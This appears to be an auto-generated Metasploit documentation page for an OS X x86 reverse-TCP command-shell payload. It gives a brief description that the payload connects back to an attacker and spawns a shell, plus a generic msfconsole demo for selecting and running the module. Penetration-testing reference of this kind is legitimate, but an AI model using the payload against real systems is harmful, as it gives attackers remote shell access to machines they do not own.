## OS X (vfork) Command Shell, Reverse TCP Inline

Connect back to attacker, vfork if necessary, and spawn a 
command shell


## Module Name
payload/osx/x86/vforkshell_reverse_tcp

## Authors
ddz





## Platforms
osx

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/osx/x86/vforkshell_reverse_tcp
msf payload(vforkshell_reverse_tcp) > show targets
   ... a list of targets ...
msf payload(vforkshell_reverse_tcp) > set TARGET <target-id>
msf payload(vforkshell_reverse_tcp) > show options
   ... show and set options ...
msf payload(vforkshell_reverse_tcp) > run
```
    
    